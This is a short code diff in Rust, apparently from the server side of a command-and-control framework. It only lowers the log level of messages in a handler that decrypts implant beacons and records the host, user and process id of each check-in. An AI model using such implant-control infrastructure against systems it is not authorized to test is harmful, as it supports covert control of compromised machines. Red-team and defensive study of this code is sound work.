@@ -405,7 +405,7 @@ async fn checkin_handler(
 /// The response is encrypted with the same session key and returned in the
 /// same wire format.
 async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl IntoResponse {
-    tracing::info!("beacon_handler: received {} bytes", body.len());
+    tracing::debug!("beacon_handler: received {} bytes", body.len());
 
     if body.len() < BEACON_MIN_SIZE {
         tracing::warn!("beacon_handler: body too small ({} < {})", body.len(), BEACON_MIN_SIZE);
@@ -429,12 +429,12 @@ async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl Int
     // Reconstruct the full implant public key by looking up session by prefix.
     // For the first check-in, we accept the full 32-byte key from the ciphertext header
     // and register a new session.
-    tracing::info!("beacon_handler: looking up session for prefix {:02x}{:02x}{:02x}{:02x}...",
+    tracing::debug!("beacon_handler: looking up session for prefix {:02x}{:02x}{:02x}{:02x}...",
         implant_id_prefix[0], implant_id_prefix[1], implant_id_prefix[2], implant_id_prefix[3]);
 
     let (session_key, session_id, implant_pubkey) = match derive_session_key(&state, implant_id_prefix).await {
         Ok(result) => {
-            tracing::info!("beacon_handler: session key derived, session_id={:?}", result.1);
+            tracing::debug!("beacon_handler: session key derived, session_id={:?}", result.1);
             result
         },
         Err(_) => {
@@ -456,7 +456,7 @@ async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl Int
 
     let plaintext = match cipher.decrypt(nonce, ct_with_tag.as_slice()) {
         Ok(pt) => {
-            tracing::info!("beacon_handler: decrypted {} bytes", pt.len());
+            tracing::debug!("beacon_handler: decrypted {} bytes", pt.len());
             pt
         },
         Err(e) => {
@@ -467,11 +467,11 @@ async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl Int
 
     // Try binary TLV first (implant sends TLV), fall back to JSON (mock implant, profile path)
     let (checkin_req, is_binary) = if let Some(req) = parse_binary_checkin(&plaintext) {
-        tracing::info!("beacon_handler: parsed TLV checkin — host={}, user={}, pid={}",
+        tracing::debug!("beacon_handler: parsed TLV checkin — host={}, user={}, pid={}",
             req.hostname, req.username, req.pid);
         (req, true)
     } else if let Ok(req) = serde_json::from_slice::<CheckinRequest>(&plaintext) {
-        tracing::info!("beacon_handler: parsed JSON checkin");
+        tracing::debug!("beacon_handler: parsed JSON checkin");
         (req, false)
     } else {
         tracing::warn!(
